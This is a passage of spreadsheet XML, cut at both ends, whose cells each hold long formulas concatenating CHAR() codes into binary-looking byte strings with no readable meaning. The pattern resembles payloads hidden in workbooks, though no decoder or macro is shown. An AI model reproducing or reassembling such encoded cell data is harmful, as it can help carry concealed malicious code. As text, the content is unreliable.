;CHAR(57)&amp;CHAR(66)&amp;CHAR(127)&amp;CHAR(33)&amp;CHAR(117)&amp;CHAR(251)&amp;CHAR(107)&amp;CHAR(20)&amp;CHAR(88)&amp;CHAR(113)&amp;CHAR(75)&amp;CHAR(137)&amp;CHAR(94)&amp;CHAR(196)&amp;CHAR(179)&amp;CHAR(47)&amp;CHAR(138)&amp;CHAR(155)&amp;CHAR(183)&amp;CHAR(83)&amp;CHAR(139)&amp;CHAR(234)&amp;CHAR(135)&amp;CHAR(242)&amp;CHAR(137)&amp;CHAR(22)&amp;CHAR(19)&amp;CHAR(174)&amp;CHAR(212)&amp;CHAR(231)&amp;CHAR(196)&amp;CHAR(200)&amp;CHAR(170)&amp;CHAR(176)&amp;CHAR(138)&amp;CHAR(62)&amp;CHAR(100)&amp;CHAR(220)&amp;CHAR(35)&amp;CHAR(220)&amp;CHAR(109)&amp;CHAR(201)&amp;CHAR(237)&amp;CHAR(17)&amp;CHAR(177)&amp;CHAR(25)&amp;CHAR(64)&amp;CHAR(104)&amp;CHAR(76)&amp;CHAR(145)&amp;CHAR(240)&amp;CHAR(99)&amp;CHAR(93)&amp;CHAR(103)&amp;CHAR(143)&amp;CHAR(247)&amp;CHAR(21)&amp;CHAR(220)&amp;CHAR(67)&amp;CHAR(106)&amp;CHAR(250)&amp;CHAR(190)&amp;CHAR(61)&amp;CHAR(135)&amp;CHAR(105)&amp;CHAR(203)&amp;CHAR(119)&amp;CHAR(227)&amp;CHAR(158)&amp;CHAR(54)&amp;CHAR(208)&amp;CHAR(250)&amp;CHAR(120)&amp;CHAR(214)&amp;CHAR(1)&amp;CHAR(163)&amp;CHAR(65)&amp;CHAR(157)&amp;CHAR(81)&amp;CHAR(127)&amp;CHAR(75)&amp;CHAR(59)&amp;CHAR(210)&amp;CHAR(149)&amp;CHAR(187)&amp;CHAR(123)&amp;CHAR(71)&amp;CHAR(239)&amp;CHAR(115)&amp;CHAR(108)&amp;CHAR(227)&amp;CHAR(185)&amp;CHAR(47)&amp;CHAR(59)&amp;CHAR(184)&amp;CHAR(177)&amp;CHAR(59)&amp;CHAR(1)&amp;CHAR(185)&amp;CHAR(80)&amp;CHAR(234)&amp;CHAR(226)&amp;CHAR(220)&amp;CHAR(176)&amp;CHAR(164)&amp;CHAR(8)&amp;CHAR(22)&amp;CHAR(144)&amp;CHAR(60)&amp;CHAR(178)&amp;CHAR(24)&amp;CHAR(116)&amp;CHAR(22)&amp;CHAR(163)&amp;CHAR(157)&amp;CHAR(96)&amp;CHAR(232)&amp;CHAR(23)&amp;CHAR(101)&amp;CHAR(46)&amp;CHAR(31)&amp;CHAR(57)&amp;CHAR(2)&amp;CHAR(93)&amp;CHAR(194)&amp;CHAR(186)&amp;CHAR(128)&amp;CHAR(213)&amp;CHAR(127)&amp;CHAR(27)&amp;CHAR(178)&amp;CHAR(195)&amp;CHAR(63)&amp;CHAR(1)&amp;CHAR(151)&amp;CHAR(170)&amp;CHAR(179)&amp;CHAR(154)&amp;CHAR(39)&amp;CHAR(209)&amp;CHAR(39)&amp;CHAR(89)&amp;CHAR(69)&amp;CHAR(112)&amp;CHAR(241)&amp;CHAR(188)&amp;CHAR(51)&amp;CHAR(221)&amp;CHAR(32)&amp;CHAR(202)&amp;CHAR(134)&amp;CHAR(89)&amp;CHAR(164)&amp;CHAR(196)&amp;CHAR(19)&amp;CHAR(118)&amp;CHAR(159)&amp;CHAR(122)&amp;CHAR(62)&amp;CHAR(16)&amp;CHAR(214)&amp;CHAR(199)&amp;CHAR(93)&amp;CHAR(71)&amp;CHAR(41)&amp;CHAR(115)&amp;CHAR(192)</f>
        <v>'Â9ìÎ†‹üôÃßÍ±ÂÅ‡_x0003_|Øz0Á45ZY_x000D_x&lt;_x001A_õ#¦MóÝ	Õë|ÈÞÈ_x0014_LTë`ˆÜœm†Þáì_x0002_º¯‹CEÂÍ0¤hä3ô/&gt;ü‹ÃÏso_x000C_¹×_x001D_5zÌç‚9B!uûk_x0014_XqK‰^Ä³/Š›·S‹ê‡ò‰_x0016__x0013_®ÔçÄÈª°Š&gt;dÜ#ÜmÉí_x0011_±_x0019_@hL‘ðc]g÷_x0015_ÜCjú¾=‡iËwãž6ÐúxÖ_x0001_£AQK;Ò•»{Gïslã¹/;¸±;_x0001_¹PêâÜ°¤_x0008__x0016_&lt;²_x0018_t_x0016_£`è_x0017_e._x001F_9_x0002_]Âº€Õ_x001B_²Ã?_x0001_—ª³š'Ñ'YEpñ¼3Ý Ê†Y¤Ä_x0013_vŸz&gt;_x0010_ÖÇ]G)sÀ</v>
      </c>
      <c r="C85" t="str">
        <f>CHAR(50)&amp;CHAR(109)&amp;CHAR(127)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(168)&amp;CHAR(163)&amp;CHAR(48)&amp;CHAR(255)</f>
        <v>2mýô6¨£0ÿ</v>
      </c>
    </row>
    <row r="86" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B86" t="str">
        <f>CHAR(192)&amp;CHAR(24)&amp;CHAR(58)&amp;CHAR(51)&amp;CHAR(239)&amp;CHAR(254)&amp;CHAR(18)&amp;CHAR(16)&amp;CHAR(182)&amp;CHAR(144)&amp;CHAR(129)&amp;CHAR(209)&amp;CHAR(188)&amp;CHAR(154)&amp;CHAR(58)&amp;CHAR(230)&amp;CHAR(255)&amp;CHAR(75)&amp;CHAR(105)&amp;CHAR(133)&amp;CHAR(245)&amp;CHAR(177)&amp;CHAR(16)&amp;CHAR(220)&amp;CHAR(143)&amp;CHAR(210)&amp;CHAR(141)&amp;CHAR(106)&amp;CHAR(123)&amp;CHAR(120)&amp;CHAR(250)&amp;CHAR(171)&amp;CHAR(144)&amp;CHAR(120)&amp;CHAR(127)&amp;CHAR(12)&amp;CHAR(198)&amp;CHAR(251)&amp;CHAR(46)&amp;CHAR(28)&amp;CHAR(54)&amp;CHAR(102)&amp;CHAR(55)&amp;CHAR(195)&amp;CHAR(46)&amp;CHAR(57)&amp;CHAR(247)&amp;CHAR(105)&amp;CHAR(93)&amp;CHAR(218)&amp;CHAR(44)&amp;CHAR(35)&amp;CHAR(120)&amp;CHAR(222)&amp;CHAR(66)&amp;CHAR(213)&amp;CHAR(188)&amp;CHAR(188)&amp;CHAR(157)&amp;CHAR(236)&amp;CHAR(211)&amp;CHAR(173)&amp;CHAR(215)&amp;CHAR(3)&amp;CHAR(211)&amp;CHAR(245)&amp;CHAR(49)&amp;CHAR(97)&amp;CHAR(98)&amp;CHAR(249)&amp;CHAR(120)&amp;CHAR(96)&amp;CHAR(188)&amp;CHAR(55)&amp;CHAR(16)&amp;CHAR(208)&amp;CHAR(235)&amp;CHAR(189)&amp;CHAR(189)&amp;CHAR(234)&amp;CHAR(157)&amp;CHAR(128)&amp;CHAR(59)&amp;CHAR(75)&amp;CHAR(134)&amp;CHAR(180)&amp;CHAR(164)&amp;CHAR(142)&amp;CHAR(16)&amp;CHAR(159)&amp;CHAR(97)&amp;CHAR(99)&amp;CHAR(45)&amp;CHAR(5)&amp;CHAR(110)&amp;CHAR(179)&amp;CHAR(250)&amp;CHAR(71)&amp;CHAR(199)&amp;CHAR(109)&amp;CHAR(219)&amp;CHAR(30)&amp;CHAR(44)&amp;CHAR(169)&amp;CHAR(48)&amp;CHAR(155)&amp;CHAR(217)&amp;CHAR(150)&amp;CHAR(49)&amp;CHAR(224)&amp;CHAR(68)&amp;CHAR(39)&amp;CHAR(13)&amp;CHAR(231)&amp;CHAR(201)&amp;CHAR(244)&amp;CHAR(50)&amp;CHAR(175)&amp;CHAR(21)&amp;CHAR(8)&amp;CHAR(164)&amp;CHAR(248)&amp;CHAR(30)&amp;CHAR(6)&amp;CHAR(124)&amp;CHAR(104)&amp;CHAR(215)&amp;CHAR(160)&amp;CHAR(23)&amp;CHAR(166)&amp;CHAR(63)&amp;CHAR(201)&amp;CHAR(184)&amp;CHAR(102)&amp;CHAR(172)&amp;CHAR(151)&amp;CHAR(30)&amp;CHAR(197)&amp;CHAR(14)&amp;CHAR(107)&amp;CHAR(254)&amp;CHAR(220)&amp;CHAR(61)&amp;CHAR(30)&amp;CHAR(176)&amp;CHAR(245)&amp;CHAR(162)&amp;CHAR(126)&amp;CHAR(45)&amp;CHAR(252)&amp;CHAR(143)&amp;CHAR(245)&amp;CHAR(231)&amp;CHAR(203)&amp;CHAR(252)&amp;CHAR(32)&amp;CHAR(110)&amp;CHAR(70)&amp;CHAR(20)&amp;CHAR(87)&amp;CHAR(255)&amp;CHAR(104)&amp;CHAR(6)&amp;CHAR(8)&amp;CHAR(224)&amp;CHAR(159)&amp;CHAR(244)&amp;CHAR(16)&amp;CHAR(68)&amp;CHAR(37)&amp;CHAR(37)&amp;CHAR(140)&amp;CHAR(213)&amp;CHAR(226)&amp;CHAR(61)&amp;CHAR(175)&amp;CHAR(53)&amp;CHAR(141)&amp;CHAR(126)&amp;CHAR(155)&amp;CHAR(240)&amp;CHAR(171)&amp;CHAR(159)&amp;CHAR(241)&amp;CHAR(150)&amp;CHAR(54)&amp;CHAR(161)&amp;CHAR(158)&amp;CHAR(252)&amp;CHAR(83)&amp;CHAR(82)&amp;CHAR(80)&amp;CHAR(166)&amp;CHAR(192)&amp;CHAR(220)&amp;CHAR(81)&amp;CHAR(36)&amp;CHAR(233)&amp;CHAR(111)&amp;CHAR(142)&amp;CHAR(162)&amp;CHAR(233)&amp;CHAR(173)&amp;CHAR(22)&amp;CHAR(210)&amp;CHAR(39)&amp;CHAR(18)&amp;CHAR(219)&amp;CHAR(131)&amp;CHAR(187)&amp;CHAR(26)&amp;CHAR(108)&amp;CHAR(252)&amp;CHAR(35)&amp;CHAR(94)&amp;CHAR(236)&amp;CHAR(151)&amp;CHAR(173)&amp;CHAR(103)&amp;CHAR(133)&amp;CHAR(59)&amp;CHAR(191)&amp;CHAR(163)&amp;CHAR(198)&amp;CHAR(150)&amp;CHAR(193)&amp;CHAR(209)&amp;CHAR(114)&amp;CHAR(11)&amp;CHAR(98)&amp;CHAR(245)&amp;CHAR(123)&amp;CHAR(147)&amp;CHAR(30)&amp;CHAR(66)&amp;CHAR(171)&amp;CHAR(107)&amp;CHAR(200)&amp;CHAR(62)&amp;CHAR(159)&amp;CHAR(246)&amp;CHAR(144)&amp;CHAR(44)&amp;CHAR(165)&amp;CHAR(40)&amp;CHAR(140)&amp;CHAR(25)&amp;CHAR(30)&amp;CHAR(222)&amp;CHAR(26)&amp;CHAR(122)&amp;CHAR(76)&amp;CHAR(141)&amp;CHAR(202)&amp;CHAR(171)</f>
        <v>À_x0018_:3ïþ_x0012__x0010_¶Ñ¼š:æÿKi…õ±_x0010_ÜÒj{xú«x_x000C_Æû._x001C_6f7Ã.9÷i]Ú,#xÞBÕ¼¼ìÓ­×_x0003_Óõ1abùx`¼7_x0010_Ðë½½ê€;K†´¤Ž_x0010_Ÿac-_x0005_n³úGÇmÛ_x001E_,©0›Ù–1àD'_x000D_çÉô2¯_x0015__x0008_¤ø_x001E__x0006_|h× _x0017_¦?É¸f¬—_x001E_Å_x000E_kþÜ=_x001E_°õ¢~-üõçËü nF_x0014_Wÿh_x0006__x0008_àŸô_x0010_D%%ŒÕâ=¯5~›ð«Ÿñ–6¡žüSRP¦ÀÜQ$éoŽ¢é­_x0016_Ò'_x0012_Ûƒ»_x001A_lü#^ì—­g…;¿£Æ–ÁÑr_x000B_bõ{“_x001E_B«kÈ&gt;Ÿö,¥(Œ_x0019__x001E_Þ_x001A_zLÊ«</v>
      </c>
      <c r="C86" t="str">
        <f>CHAR(210)&amp;CHAR(213)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(163)&amp;CHAR(58)&amp;CHAR(41)&amp;CHAR(119)&amp;CHAR(253)</f>
        <v>ÒÕô6Í£:)wý</v>
      </c>
    </row>
    <row r="87" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B87" t="str">
        <f>CHAR(20)&amp;CHAR(252)&amp;CHAR(109)&amp;CHAR(63)&amp;CHAR(188)&amp;CHAR(50)&amp;CHAR(201)&amp;CHAR(58)&amp;CHAR(79)&amp;CHAR(230)&amp;CHAR(195)&amp;CHAR(237)&amp;CHAR(176)&amp;CHAR(125)&amp;CHAR(93)&amp;CHAR(61)&amp;CHAR(251)&amp;CHAR(11)&amp;CHAR(49)&amp;CHAR(173)&amp;CHAR(251)&amp;CHAR(67)&amp;CHAR(107)&amp;CHAR(188)&amp;CHAR(185)&amp;CHAR(69)&amp;CHAR(23)&amp;CHAR(21)&amp;CHAR(117)&amp;CHAR(176)&amp;CHAR(210)&amp;CHAR(155)&amp;CHAR(190)&amp;CHAR(67)&amp;CHAR(102)&amp;CHAR(10)&amp;CHAR(241)&amp;CHAR(255)&amp;CHAR(200)&amp;CHAR(176)&amp;CHAR(226)&amp;CHAR(61)&amp;CHAR(194)&amp;CHAR(140)&amp;CHAR(251)&amp;CHAR(40)&amp;CHAR(97)&amp;CHAR(126)&amp;CHAR(83)&amp;CHAR(98)&amp;CHAR(8)&amp;CHAR(102)&amp;CHAR(99)&amp;CHAR(90)&amp;CHAR(44)&amp;CHAR(167)&amp;CHAR(238)&amp;CHAR(45)&amp;CHAR(132)&amp;CHAR(43)&amp;CHAR(15)&amp;CHAR(35)&amp;CHAR(152)&amp;CHAR(170)&amp;CHAR(4)&amp;CHAR(62)&amp;CHAR(48)&amp;CHAR(103)&amp;CHAR(215)&amp;CHAR(212)&amp;CHAR(99)&amp;CHAR(33)&amp;CHAR(112)&amp;CHAR(162)&amp;CHAR(251)&amp;CHAR(252)&amp;CHAR(236)&amp;CHAR(168)&amp;CHAR(9)&amp;CHAR(157)&amp;CHAR(232)&amp;CHAR(111)&amp;CHAR(29)&amp;CHAR(73)&amp;CHAR(240)&amp;CHAR(71)&amp;CHAR(165)&amp;CHAR(199)&amp;CHAR(110)&amp;CHAR(157)&amp;CHAR(251)&amp;CHAR(5)&amp;CHAR(204)&amp;CHAR(229)&amp;CHAR(39)&amp;CHAR(52)&amp;CHAR(145)&amp;CHAR(75)&amp;CHAR(19)&amp;CHAR(213)&amp;CHAR(172)&amp;CHAR(49)&amp;CHAR(107)&amp;CHAR(145)&amp;CHAR(158)&amp;CHAR(144)&amp;CHAR(59)&amp;CHAR(76)&amp;CHAR(24)&amp;CHAR(211)&amp;CHAR(105)&amp;CHAR(57)&amp;CHAR(123)&amp;CHAR(31)&amp;CHAR(243)&amp;CHAR(28)&amp;CHAR(244)&amp;CHAR(198)&amp;CHAR(106)&amp;CHAR(226)&amp;CHAR(21)&amp;CHAR(88)&amp;CHAR(194)&amp;CHAR(229)&amp;CHAR(47)&amp;CHAR(186)&amp;CHAR(115)&amp;CHAR(180)&amp;CHAR(191)&amp;CHAR(94)&amp;CHAR(147)&amp;CHAR(158)&amp;CHAR(48)&amp;CHAR(224)&amp;CHAR(108)&amp;CHAR(46)&amp;CHAR(195)&amp;CHAR(252)&amp;CHAR(255)&amp;CHAR(214)&amp;CHAR(50)&amp;CHAR(43)&amp;CHAR(135)&amp;CHAR(72)&amp;CHAR(250)&amp;CHAR(236)&amp;CHAR(151)&amp;CHAR(197)&amp;CHAR(22)&amp;CHAR(172)&amp;CHAR(114)&amp;CHAR(16)&amp;CHAR(201)&amp;CHAR(21)&amp;CHAR(89)&amp;CHAR(238)&amp;CHAR(169)&amp;CHAR(114)&amp;CHAR(125)&amp;CHAR(139)&amp;CHAR(160)&amp;CHAR(99)&amp;CHAR(213)&amp;CHAR(78)&amp;CHAR(221)&amp;CHAR(254)&amp;CHAR(42)&amp;CHAR(34)&amp;CHAR(220)&amp;CHAR(63)&amp;CHAR(235)&amp;CHAR(182)&amp;CHAR(18)&amp;CHAR(251)&amp;CHAR(63)&amp;CHAR(134)&amp;CHAR(161)&amp;CHAR(139)&amp;CHAR(24)&amp;CHAR(114)&amp;CHAR(49)&amp;CHAR(176)&amp;CHAR(145)&amp;CHAR(136)&amp;CHAR(102)&amp;CHAR(129)&amp;CHAR(161)&amp;CHAR(5)&amp;CHAR(108)&amp;CHAR(61)&amp;CHAR(57)&amp;CHAR(11)&amp;CHAR(68)&amp;CHAR(184)&amp;CHAR(195)&amp;CHAR(166)&amp;CHAR(70)&amp;CHAR(198)&amp;CHAR(140)&amp;CHAR(158)&amp;CHAR(35)&amp;CHAR(73)&amp;CHAR(198)&amp;CHAR(113)&amp;CHAR(184)&amp;CHAR(124)&amp;CHAR(46)&amp;CHAR(75)&amp;CHAR(231)&amp;CHAR(53)&amp;CHAR(62)&amp;CHAR(49)&amp;CHAR(247)&amp;CHAR(86)&amp;CHAR(138)&amp;CHAR(110)&amp;CHAR(180)&amp;CHAR(25)&amp;CHAR(48)&amp;CHAR(212)&amp;CHAR(51)&amp;CHAR(153)&amp;CHAR(250)&amp;CHAR(46)&amp;CHAR(245)&amp;CHAR(189)&amp;CHAR(159)&amp;CHAR(220)&amp;CHAR(248)&amp;CHAR(31)&amp;CHAR(140)&amp;CHAR(24)&amp;CHAR(16)&amp;CHAR(122)&amp;CHAR(18)&amp;CHAR(35)&amp;CHAR(224)&amp;CHAR(80)&amp;CHAR(173)&amp;CHAR(42)&amp;CHAR(124)&amp;CHAR(12)&amp;CHAR(16)&amp;CHAR(122)&amp;CHAR(22)&amp;CHAR(151)&amp;CHAR(191)&amp;CHAR(87)&amp;CHAR(247)&amp;CHAR(55)&amp;CHAR(125)&amp;CHAR(182)&amp;CHAR(222)&amp;CHAR(23)&amp;CHAR(172)</f>
        <v>_x0014_üm?¼2É:OæÃí°}]=û_x000B_1­ûCk¼¹E_x0017__x0015_u°Ò›¾Cf
ñÿÈ°â=ÂŒû(a~Sb_x0008_fcZ,§î-„+_x000F_#˜ª_x0004_&gt;0g×Ôc!p¢ûüì¨	èo_x001D_IðG¥Çnû_x0005_Ìå'4‘K_x0013_Õ¬1k‘ž;L_x0018_Ói9{_x001F_ó_x001C_ôÆjâ_x0015_XÂå/ºs´¿^“ž0àl.ÃüÿÖ2+‡Húì—Å_x0016_¬r_x0010_É_x0015_Yî©r}‹ cÕNÝþ*"Ü?ë¶_x0012_û?†¡‹_x0018_r1°‘ˆf¡_x0005_l=9_x000B_D¸Ã¦FÆŒž#IÆq¸|.Kç5&gt;1÷VŠn´_x0019_0Ô3™ú.õ½ŸÜø_x001F_Œ_x0018__x0010_z_x0012_#àP­*|_x000C__x0010_z_x0016_—¿W÷7}¶Þ_x0017_¬</v>
      </c>
      <c r="C87" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(168)&amp;CHAR(163)&amp;CHAR(48)&amp;CHAR(231)&amp;CHAR(210)&amp;CHAR(213)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô6¨£0çÒÕô6</v>
      </c>
    </row>
    <row r="88" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B88" t="str">
        <f>CHAR(37)&amp;CHAR(149)&amp;CHAR(246)&amp;CHAR(56)&amp;CHAR(92)&amp;CHAR(98)&amp;CHAR(210)&amp;CHAR(5)&amp;CHAR(211)&amp;CHAR(115)&amp;CHAR(247)&amp;CHAR(58)&amp;CHAR(41)&amp;CHAR(17)&amp;CHAR(46)&amp;CHAR(222)&amp;CHAR(95)&amp;CHAR(128)&amp;CHAR(148)&amp;CHAR(229)&amp;CHAR(119)&amp;CHAR(240)&amp;CHAR(50)&amp;CHAR(238)&amp;CHAR(243)&amp;CHAR(31)&amp;CHAR(11)&amp;CHAR(232)&amp;CHAR(236)&amp;CHAR(113)&amp;CHAR(185)&amp;CHAR(178)&amp;CHAR(8)&amp;CHAR(168)&amp;CHAR(73)&amp;CHAR(183)&amp;CHAR(102)&amp;CHAR(64)&amp;CHAR(190)&amp;CHAR(157)&amp;CHAR(107)&amp;CHAR(243)&amp;CHAR(66)&amp;CHAR(93)&amp;CHAR(149)&amp;CHAR(151)&amp;CHAR(155)&amp;CHAR(53)&amp;CHAR(234)&amp;CHAR(177)&amp;CHAR(176)&amp;CHAR(189)&amp;CHAR(222)&amp;CHAR(227)&amp;CHAR(141)&amp;CHAR(26)&amp;CHAR(8)&amp;CHAR(206)&amp;CHAR(137)&amp;CHAR(207)&amp;CHAR(56)&amp;CHAR(105)&amp;CHAR(194)&amp;CHAR(139)&amp;CHAR(9)&amp;CHAR(241)&amp;CHAR(176)&amp;CHAR(207)&amp;CHAR(209)&amp;CHAR(152)&amp;CHAR(21)&amp;CHAR(141)&amp;CHAR(110)&amp;CHAR(2)&amp;CHAR(145)&amp;CHAR(217)&amp;CHAR(251)&amp;CHAR(138)&amp;CHAR(235)&amp;CHAR(57)&amp;CHAR(134)&amp;CHAR(182)&amp;CHAR(121)&amp;CHAR(225)&amp;CHAR(220)&amp;CHAR(72)&amp;CHAR(153)&amp;CHAR(149)&amp;CHAR(217)&amp;CHAR(159)&amp;CHAR(153)&amp;CHAR(113)&amp;CHAR(242)&amp;CHAR(173)&amp;CHAR(72)&amp;CHAR(73)&amp;CHAR(7)&amp;CHAR(101)&amp;CHAR(66)&amp;CHAR(204)&amp;CHAR(181)&amp;CHAR(80)&amp;CHAR(247)&amp;CHAR(145)&amp;CHAR(183)&amp;CHAR(212)&amp;CHAR(85)&amp;CHAR(185)&amp;CHAR(15)&amp;CHAR(213)&amp;CHAR(252)&amp;CHAR(200)&amp;CHAR(167)&amp;CHAR(203)&amp;CHAR(241)&amp;CHAR(2)&amp;CHAR(244)&amp;CHAR(127)&amp;CHAR(248)&amp;CHAR(17)&amp;CHAR(182)&amp;CHAR(104)&amp;CHAR(219)&amp;CHAR(66)&amp;CHAR(242)&amp;CHAR(187)&amp;CHAR(156)&amp;CHAR(37)&amp;CHAR(28)&amp;CHAR(86)&amp;CHAR(221)&amp;CHAR(99)&amp;CHAR(109)&amp;CHAR(15)&amp;CHAR(110)&amp;CHAR(135)&amp;CHAR(69)&amp;CHAR(255)&amp;CHAR(23)&amp;CHAR(26)&amp;CHAR(207)&amp;CHAR(230)&amp;CHAR(7)&amp;CHAR(147)&amp;CHAR(196)&amp;CHAR(98)&amp;CHAR(6)&amp;CHAR(145)&amp;CHAR(178)&amp;CHAR(149)&amp;CHAR(140)&amp;CHAR(18)&amp;CHAR(128)&amp;CHAR(16)&amp;CHAR(75)&amp;CHAR(46)&amp;CHAR(163)&amp;CHAR(218)&amp;CHAR(48)&amp;CHAR(188)&amp;CHAR(20)&amp;CHAR(228)&amp;CHAR(74)&amp;CHAR(14)&amp;CHAR(223)&amp;CHAR(251)&amp;CHAR(188)&amp;CHAR(221)&amp;CHAR(77)&amp;CHAR(249)&amp;CHAR(71)&amp;CHAR(132)&amp;CHAR(162)&amp;CHAR(45)&amp;CHAR(99)&amp;CHAR(164)&amp;CHAR(240)&amp;CHAR(104)&amp;CHAR(112)&amp;CHAR(199)&amp;CHAR(210)&amp;CHAR(103)&amp;CHAR(166)&amp;CHAR(177)&amp;CHAR(124)&amp;CHAR(134)&amp;CHAR(234)&amp;CHAR(159)&amp;CHAR(164)&amp;CHAR(186)&amp;CHAR(42)&amp;CHAR(221)&amp;CHAR(177)&amp;CHAR(215)&amp;CHAR(2)&amp;CHAR(52)&amp;CHAR(187)&amp;CHAR(96)&amp;CHAR(212)&amp;CHAR(243)&amp;CHAR(70)&amp;CHAR(65)&amp;CHAR(205)&amp;CHAR(84)&amp;CHAR(48)&amp;CHAR(254)&amp;CHAR(185)&amp;CHAR(173)&amp;CHAR(82)&amp;CHAR(137)&amp;CHAR(245)&amp;CHAR(222)&amp;CHAR(93)&amp;CHAR(67)&amp;CHAR(244)&amp;CHAR(102)&amp;CHAR(242)&amp;CHAR(254)&amp;CHAR(138)&amp;CHAR(219)&amp;CHAR(245)&amp;CHAR(5)&amp;CHAR(246)&amp;CHAR(103)&amp;CHAR(178)&amp;CHAR(84)&amp;CHAR(30)&amp;CHAR(95)&amp;CHAR(214)&amp;CHAR(32)&amp;CHAR(240)&amp;CHAR(208)&amp;CHAR(156)&amp;CHAR(11)&amp;CHAR(37)&amp;CHAR(240)&amp;CHAR(13)&amp;CHAR(141)&amp;CHAR(195)&amp;CHAR(190)&amp;CHAR(161)&amp;CHAR(10)&amp;CHAR(113)&amp;CHAR(215)&amp;CHAR(156)&amp;CHAR(228)&amp;CHAR(3)&amp;CHAR(33)&amp;CHAR(84)&amp;CHAR(243)&amp;CHAR(120)&amp;CHAR(87)&amp;CHAR(205)&amp;CHAR(213)&amp;CHAR(230)</f>
        <v>%•ö8\bÒ_x0005_Ós÷:)_x0011_.Þ_€”åwð2îó_x001F__x000B_èìq¹²_x0008_¨I·f@¾kóB]•—›5ê±°½Þã_x001A__x0008_Î‰Ï8iÂ‹	ñ°ÏÑ˜_x0015_n_x0002_‘ÙûŠë9†¶yáÜH™•ÙŸ™qò­HI_x0007_eBÌµP÷‘·ÔU¹_x000F_ÕüÈ§Ëñ_x0002_ôø_x0011_¶hÛBò»œ%_x001C_VÝcm_x000F_n‡Eÿ_x0017__x001A_Ïæ_x0007_“Äb_x0006_‘²•Œ_x0012_€_x0010_K.£Ú0¼_x0014_äJ_x000E_ßû¼ÝMùG„¢-c¤ðhpÇÒg¦±|†êŸ¤º*Ý±×_x0002_4»`ÔóFAÍT0þ¹­R‰õÞ]CôfòþŠÛõ_x0005_ög²T_x001E__Ö ðÐœ_x000B_%ð_x000D_Ã¾¡
q×œä_x0003_!TóxWÍÕæ</v>
      </c>
      <c r="C88" t="str">
        <f>CHAR(205)&amp;CHAR(163)&amp;CHAR(58)&amp;CHAR(42)&amp;CHAR(127)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(133)&amp;CHAR(96)</f>
        <v>Í£:*ýô6…`</v>
      </c>
    </row>
    <row r="89" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B89" t="str">
        <f>CHAR(181)&amp;CHAR(151)&amp;CHAR(188)&amp;CHAR(146)&amp;CHAR(153)&amp;CHAR(221)&amp;CHAR(68)&amp;CHAR(169)&amp;CHAR(153)&amp;CHAR(161)&amp;CHAR(161)&amp;CHAR(210)&amp;CHAR(184)&amp;CHAR(227)&amp;CHAR(96)&amp;CHAR(68)&amp;CHAR(109)&amp;CHAR(197)&amp;CHAR(208)&amp;CHAR(8)&amp;CHAR(213)&amp;CHAR(72)&amp;CHAR(11)&amp;CHAR(125)&amp;CHAR(86)&amp;CHAR(157)&amp;CHAR(247)&amp;CHAR(35)&amp;CHAR(167)&amp;CHAR(54)&amp;CHAR(168)&amp;CHAR(104)&amp;CHAR(26)&amp;CHAR(243)&amp;CHAR(167)&amp;CHAR(96)&amp;CHAR(23)&amp;CHAR(112)&amp;CHAR(253)&amp;CHAR(10)&amp;CHAR(183)&amp;CHAR(114)&amp;CHAR(49)&amp;CHAR(77)&amp;CHAR(90)&amp;CHAR(159)&amp;CHAR(33)&amp;CHAR(134)&amp;CHAR(241)&amp;CHAR(79)&amp;CHAR(135)&amp;CHAR(208)&amp;CHAR(5)&amp;CHAR(255)&amp;CHAR(30)&amp;CHAR(73)&amp;CHAR(101)&amp;CHAR(221)&amp;CHAR(40)&amp;CHAR(152)&amp;CHAR(131)&amp;CHAR(148)&amp;CHAR(171)&amp;CHAR(161)&amp;CHAR(157)&amp;CHAR(50)&amp;CHAR(159)&amp;CHAR(107)&amp;CHAR(108)&amp;CHAR(209)&amp;CHAR(214)&amp;CHAR(252)&amp;CHAR(147)&amp;CHAR(4)&amp;CHAR(219)&amp;CHAR(14)&amp;CHAR(247)&amp;CHAR(171)&amp;CHAR(158)&amp;CHAR(70)&amp;CHAR(178)&amp;CHAR(162)&amp;CHAR(188)&amp;CHAR(222)&amp;CHAR(172)&amp;CHAR(101)&amp;CHAR(104)&amp;CHAR(8)&amp;CHAR(220)&amp;CHAR(203)&amp;CHAR(154)&amp;CHAR(40)&amp;CHAR(81)&amp;CHAR(238)&amp;CHAR(54)&amp;CHAR(26)&amp;CHAR(15)&amp;CHAR(184)&amp;CHAR(152)&amp;CHAR(247)&amp;CHAR(62)&amp;CHAR(25)&amp;CHAR(78)&amp;CHAR(75)&amp;CHAR(148)&amp;CHAR(117)&amp;CHAR(69)&amp;CHAR(145)&amp;CHAR(99)&amp;CHAR(229)&amp;CHAR(240)&amp;CHAR(195)&amp;CHAR(8)&amp;CHAR(121)&amp;CHAR(136)&amp;CHAR(181)&amp;CHAR(98)&amp;CHAR(175)&amp;CHAR(255)&amp;CHAR(28)&amp;CHAR(59)&amp;CHAR(46)&amp;CHAR(226)&amp;CHAR(111)&amp;CHAR(59)&amp;CHAR(68)&amp;CHAR(126)&amp;CHAR(205)&amp;CHAR(161)&amp;CHAR(21)&amp;CHAR(52)&amp;CHAR(112)&amp;CHAR(25)&amp;CHAR(119)&amp;CHAR(176)&amp;CHAR(92)&amp;CHAR(202)&amp;CHAR(172)&amp;CHAR(38)&amp;CHAR(167)&amp;CHAR(171)&amp;CHAR(176)&amp;CHAR(181)&amp;CHAR(123)&amp;CHAR(85)&amp;CHAR(202)&amp;CHAR(27)&amp;CHAR(21)&amp;CHAR(156)&amp;CHAR(30)&amp;CHAR(133)&amp;CHAR(176)&amp;CHAR(252)&amp;CHAR(225)&amp;CHAR(191)&amp;CHAR(217)&amp;CHAR(67)&amp;CHAR(29)&amp;CHAR(193)&amp;CHAR(189)&amp;CHAR(72)&amp;CHAR(6)&amp;CHAR(70)&amp;CHAR(112)&amp;CHAR(227)&amp;CHAR(65)&amp;CHAR(54)&amp;CHAR(13)&amp;CHAR(26)&amp;CHAR(159)&amp;CHAR(140)&amp;CHAR(106)&amp;CHAR(197)&amp;CHAR(21)&amp;CHAR(252)&amp;CHAR(147)&amp;CHAR(36)&amp;CHAR(84)&amp;CHAR(101)&amp;CHAR(134)&amp;CHAR(123)&amp;CHAR(189)&amp;C